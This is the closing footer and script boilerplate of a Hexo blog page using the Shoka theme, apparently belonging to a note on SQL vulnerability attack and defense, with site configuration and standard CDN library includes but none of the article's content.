    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: 'security/WebNote/Vulnerability Attack and defense/SQL/',
    favicon: {
      show: "Incomging Transmission…",
      hide: "Target Loss"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
